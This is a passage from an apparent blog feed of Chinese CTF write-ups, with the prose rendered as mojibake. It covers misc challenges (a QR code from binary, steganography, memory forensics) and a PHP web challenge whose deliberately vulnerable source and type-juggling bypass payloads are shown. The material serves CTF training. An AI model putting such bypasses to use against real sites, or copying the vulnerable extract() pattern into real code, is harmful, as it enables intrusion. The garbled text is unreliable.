DAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;MDAwMDAwMDEwMTExMDAwMDAwMDAxMTExMTEwMTExMDAwMDAwMFxuMDExMTExMDEwMTEwMTAxMDExMTExMDAwMTExMDExMDExMTExMFxuMDEwMDAxMDEwMDAwMTExMTAwMDExMTAxMDExMDExMDEwMDAxMFxuMDEwMDAxMDExMDAwMDAxMTAwMDExMTAwMDAwMTAxMDEwMDAxMFxuMDEwMDAxMDExMTAxMTAxMTAwMTEwMTEwMTAxMTExMDEwMDAxMFxuMDExMTExMDEwMTExMDEwMDAwMDAwMTAwMTAwMDAxMDExMTExMFxuMDAwMDAwMDEwMTAxMDEwMTAxMDEwMTAxMDEwMTAxMDAwMDAwMFxuMTExMTExMTEwMDEwMDAwMDAwMDEwMDExMDAxMTExMTExMTExMVxuMTEwMDAxMDEwMTAxMDAwMDEwMTExMTExMDEwMDAwMDAxMTAwMFxuMDEwMTEwMTAwMDExMDAxMDAxMDAwMDEwMDExMDEwMTAxMTEwMVxuMTAxMTAwMDAwMTAwMTExMTAwMTEwMDAxMTAxMDAwMDAxMDAxMFxuMTExMDExMTExMTExMDAxMDEwMTEwMTAwMDExMDEwMTAxMTEwMFxuMTAxMDExMDAwMTExMDAwMDAwMDExMDEwMDAwMDAwMDAwMDAxMFxuMDExMDEwMTAwMTAwMDEwMDAxMTAxMTEwMTAxMTEwMTExMTEwMVxuMDAxMDEwMDEwMDExMTExMTEwMTExMDAwMDExMDAxMDEwMDAxMFxuMDAxMDAwMTEwMTExMDExMDExMDAxMTAwMTEwMDExMDAxMTEwMVxuMTExMDEwMDExMDAwMTExMTExMTAxMTAxMDAxMTAwMDAwMDAxMFxuMDAwMDExMTAxMDEwMDAxMTEwMDAwMDEwMTEwMTExMTExMDExMVxuMTEwMTEwMDExMDEwMTEwMTAwMTEwMDAxMDEwMDExMDAwMDEwMFxuMDEwMTAwMTAwMTExMTAwMTAwMDAwMTAwMTExMDAxMDAxMDExMVxuMDEwMTAxMDAxMTAwMDExMTAwMDExMDAxMDAwMDAxMDEwMTAwMFxuMTAwMTEwMTExMTEwMTExMDExMDAxMDAxMTExMTEwMTAxMTEwMVxuMTEwMTEwMDAxMDExMTAwMDAwMDEwMTExMDExMDAwMTAxMTAxMFxuMDAxMTAwMTAwMDExMTEwMTEwMDAxMTExMDEwMDEwMDExMTEwMVxuMDEwMTAwMDAwMTExMDEwMTExMDExMDEwMTExMTExMDEwMDAxMFxuMDEwMTAxMTAxMTAwMTAwMTAwMDAwMDExMDEwMDAxMDAxMTExMVxuMDExMDEwMDAxMDAwMTExMDAxMDExMDAxMTAxMTExMTAwMTEwMFxuMDExMTAwMTExMTEwMDAwMDAxMDExMDExMDExMTAwMTExMTEwMFxuMDEwMDExMDAxMDExMDAxMDEwMDAxMDExMTAxMTAwMDAwMDAwMFxuMTExMTExMTEwMTAxMTAwMTExMDAxMTEwMDEwMTAxMTEwMTAxMVxuMDAwMDAwMDExMTAwMDExMTAxMTAxMDExMDAwMTAxMDEwMDEwMFxuMDExMTExMDExMTAwMTEwMTAxMDExMDEwMTEwMDAxMTEwMTExMVxuMDEwMDAxMDEwMDExMDAwMDExMDAxMTAxMDAwMDAwMDAwMDAxMFxuMDEwMDAxMDEwMTExMTEwMTEwMDAxMTExMTExMTExMDEwMDExMVxuMDEwMDAxMDEwMTEwMTExMTExMTEwMDAwMDAxMDEwMTAxMDExMFxuMDExMTExMDExMTExMTAwMDEwMTEwMTAwMTExMTAwMDExMDExMFxuMDAwMDAwMDExMTExMTAxMTExMDExMDAwMDAwMDEwMDAxMTAwMA==&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>0101çš„ç»„åˆï¼Œé•¿å’Œå®½éƒ½æ˜¯37ä½ï¼Œæœæ–­çŒœä¸€ä¸‹è½¬äºŒç»´ç ï¼Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">37</span>   <span class="comment">#æ³¨æ„è¿™é‡Œä¸€å®šè¦çœ‹ä¸€ä¸‹é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">y = <span class="number">37</span></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:\\vscodework\\python\\misc\\key.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">&quot;D:\\vscodework\\python\\misc\\1.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/changanzhanyi/13.png" alt="image-20220118172445205"></p><h5 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h5><p>ä¸‹è½½é™„ä»¶ï¼Œè§£å‹ä¸€ä¸‹æœ‰å¯†ç ï¼Œæœ‰æ³¨é‡Šï¼Œå…­ä¸ªæ•°å­—<br><img src="/images/changanzhanyi/14.png" alt="image-20220118202827001"><br>çˆ†ç ´ä¸€ä¸‹å¯†ç 220101<br><img src="/images/changanzhanyi/15.png" alt="image-20220118202926688"><br>ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªemjioè¡¨æƒ…ï¼Œç†è®ºä¸Šæ¥è¯´æ˜¯emjioåŠ å¯†ï¼Œä¸€ä¸ªpycæ–‡ä»¶ï¼Œåç¼–è¯‘å‡ºæ¥  æ²¡å•¥ç”¨ï¼Œå°±ä¸ä¼šäº†<br>åæ¥çœ‹å¤§å¸ˆå‚…çš„wpï¼Œæ˜¯å‰‘é¾™åŠ å¯†ï¼Œ<code>https://github.com/AngelKitty/stegosaurus</code><br><img src="/images/changanzhanyi/16.png" alt="image-20220118204451068">æ¥ä¸€ä¸‹æœ‰ä¸ªkey<br>æ‹¿å»emjioè§£å¯†<code>https://aghorler.github.io/emoji-ae</code><br><img src="/images/changanzhanyi/17.png" alt="image-20220118204700866"><br><img src="/images/changanzhanyi/18.png" alt="image-20220118204716886"></p><h5 id="æ— å­—å¤©ä¹¦"><a href="#æ— å­—å¤©ä¹¦" class="headerlink" title="æ— å­—å¤©ä¹¦"></a>æ— å­—å¤©ä¹¦</h5><p>æ‹¿åˆ°é™„ä»¶è§£å‹ä¸€ä¸‹ï¼Œè¿‡æ»¤httpå’Œ1.php 1.phpæ˜¯ä¸ªå†°èçš„é©¬å­<br>æœ‰ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œè¿½è¸ªhttpæµï¼Œä¸‹é¢<code>504b0304</code>æ˜¯zip16è¿›åˆ¶å¤´<br><img src="/images/changanzhanyi/19.png" alt="image-20220119144025872"><br><img src="/images/changanzhanyi/20.png" alt="image-20220119144107117"><br>å¤åˆ¶å‡ºæ¥ç”¨winhexåšä¸€ä¸ªï¼Œè§£å‹æ˜¯ä¸¤ä¸ªæ–‡ä»¶<code>.ws</code>æ–‡ä»¶æ˜¯whitespaceåŠ å¯†ï¼Œè§£å¯†ä¸€ä¸‹ï¼Œæ˜¯å¯†ç ï¼Œåœ¨çº¿ç½‘å€<code>http://vii5ard.github.io/whitespace/</code><br><img src="/images/changanzhanyi/21.png" alt="image-20220119150500514"><br><img src="/images/changanzhanyi/22.png" alt="image-20220119144904711"><br><code>XiAnWillBeSafe</code><br>ç„¶åæ˜¯snowåŠ å¯†ï¼Œé¡¹ç›®åœ°å€åœ¨ä¸‹é¢ï¼Œè§£å¯†ä¸€ä¸‹å°±å‡ºäº†<br><img src="/images/changanzhanyi/23.png" alt="image-20220119150041048"><br><code>http://www.darkside.com.au/snow/</code></p><h5 id="æœ´å®æ— åçš„å–è¯"><a href="#æœ´å®æ— åçš„å–è¯" class="headerlink" title="æœ´å®æ— åçš„å–è¯"></a>æœ´å®æ— åçš„å–è¯</h5><p>æ‹¿åˆ°æ–‡ä»¶å…ˆçœ‹ä¸€ä¸‹é•œåƒç³»ç»Ÿä¿¡æ¯<br><code>python2 vol.py -f xp_sp3.raw imageinfo</code><br><img src="/images/changanzhanyi/24.png" alt="image-20220120160029257"><br>æ˜¯winxpsp2x86,çœ‹ä¸‹fileï¼Œä¸€èˆ¬filescanç»™å‡ºçš„ä¿¡æ¯å¤ªå¤šäº†ï¼Œé¢˜ç›®å¦‚æœç»™æç¤ºçš„è¯ï¼Œä¸€èˆ¬grepä¸‹æç¤ºï¼Œä¸ç»™çš„è¯grepflag<br><code>python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 filescan | grep &#39;flag&#39;</code><br><img src="/images/changanzhanyi/25.png" alt="image-20220120160645562"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ¡Œé¢ä¸Šæœ‰flag.zipå’Œflag.pngï¼Œç»Ÿç»Ÿæå–å‡ºæ¥çœ‹ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001b34f90 -D ./cab -u</span><br><span class="line">python2 vol.py -f xp_sp3.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001e65028 -D ./cab -u</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬fileä¸€ä¸‹  æ”¹ä¸‹åå­—  å¥½åŒºåˆ†<br><img src="/images/changanzhanyi/26.png" alt="image-20220120161811945"><br>zipå‹ç¼©åŒ…æ˜¯æœ‰å¯†ç çš„<br><img src="/images/changanzhanyi/27.png" alt="image-20220120162354291"><br>cmdä¸­è¿˜æœ‰ä¸€ä¸ªæ—¥è®°ï¼Œæå‡ºæ¥<img src="/images/changanzhanyi/28.png" alt="image-20220120162811234"><br>çœ‹åˆ°æ˜¯å¯†ç ï¼Œè§£å‹ä¸€ä¸‹ï¼Œé‡Œé¢æ˜¯åŠ å¯†çš„ä»£ç <br><img src="/images/changanzhanyi/29.png" alt="image-20220120162911649"><br><img src="/images/changanzhanyi/30.png" alt="image-20220120162945826"><br>æŠŠflagå›¾ç‰‡é‡Œçš„å†…å®¹æå‡ºæ¥ï¼Œè½¬æ¢ä¸€ä¸‹å°±å‡ºäº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> é•¿å®‰æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021å¼ºç½‘æ¯wp</title>
      <link href="/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/"/>
      <url>/2021/06/24/2021%E5%BC%BA%E7%BD%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="å¯»å®"><a href="#å¯»å®" class="headerlink" title="å¯»å®"></a>å¯»å®</h2><p>å¼€å±€ç»™äº†æºä»£ç ï¼Œé‚£åº”è¯¥æ˜¯è€ƒå¯Ÿphpçš„ç‰¹æ€§äº†ï¼Œæˆ‘ä»¬ä¸€ç‚¹ä¸€ç‚¹çš„çœ‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸‰å±‚&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &lt; <span class="number">8</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$num4</span>) )&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬å››å±‚&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num5</span>)||(strlen(<span class="variable">$num5</span>)==<span class="number">0</span>)) <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                    <span class="variable">$b</span>=json_decode(@<span class="variable">$num5</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$y</span> = <span class="variable">$b</span> === <span class="literal">NULL</span>)&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$y</span> === <span class="literal">true</span>)&#123;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äº”å±‚&quot;</span>;</span><br><span class="line">                                    <span class="keyword">include</span> <span class="string">&#x27;KeY1lhv.php&#x27;</span>;</span><br><span class="line">                                    <span class="keyword">echo</span> <span class="variable">$KEY1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no111&quot;</span>);&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¼€å¤´ç»™æˆ‘ä»¬è¿‡æ»¤äº†ä¸€äº›è¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç»™çš„payloadä¸å¯ä»¥æœ‰è¿™äº›å•è¯ï¼Œè¿™é‡Œé¢æ„Ÿè§‰æœ€æœ‰ç”¨çš„å°±æ˜¯<code>000000</code> äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;éæ•°å­—&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç¬¬ä¸€å±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¬¬ä¸€å±‚æ˜¯å¿…é¡»è¦è¾“å…¥num1ï¼Œä¸”ä¸èƒ½æ˜¯æ•°å­—ï¼Œæ˜¯æ•°å­—çš„è¯ï¼Œå°±ç›´æ¥è¿›å…¥else<code>die</code>äº†ã€‚<br>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨<code>is_numeric</code>çš„ä¸€ä¸ªç¼ºé™·æ¥åˆ©ç”¨ï¼Œ<code>is_numeric</code>å‡½æ•°åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—ï¼Œå¦‚æœæ˜¯æ•°å­—è¿”å›1ï¼Œå¦åˆ™è¿”å›0ï¼Œä½†å½“è¾“å…¥çš„å˜é‡æœ‰æ•°å­—å’Œå­—æ¯æ—¶ï¼Œå®ƒä¼šæˆªå–ç¬¬ä¸€ä¸ªå­—æ¯ä¹‹å‰çš„æ•°å­—ï¼Œä¸”è¿”å›0ï¼Œä¸¾ä¸ªæ —å­ï¼Œ<code>is_numeric(1234abc123)</code>ï¼Œè¿™é‡Œå®ƒä¼šå–1234ï¼Œè€Œåé¢çš„abcä»–å°±ä¸è¦äº†ã€‚é‚£è¿™æ ·çš„è¯æˆ‘ä»¬ç¬¬ä¸€å±‚ï¼Œè¿™é‡Œæˆ‘ä»¬åªéœ€<code>ppp[number1]=2222a</code>ï¼Œåªè¦æ¯”1024å¤§å°±å¯ä»¥äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;ç¬¬äºŒå±‚&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œå¿…é¡»è¾“å…¥è¾“å…¥num2ä¸”é•¿åº¦å°äºæˆ–ç­‰äº4ä¸”è¿™ä¸ªæ•°åŠ ä¸€è¦å¤§äº500000<br>æ­£å¸¸å››ä½æ•°æœ€å¤§9999æ˜¾ç„¶ä¸å¤§äº500000<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨phpé‡Œçš„ç§‘å­¦è®¡æ•°æ³•ï¼Œ<code>1e3=1*10^3</code>ä¹Ÿå°±æ˜¯è¯´</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆå¤©ç½‘å®‰weekly,10-18å‘¨</title>
      <link href="/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/"/>
      <url>/2020/09/10/%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97wp10-18/</url>
      
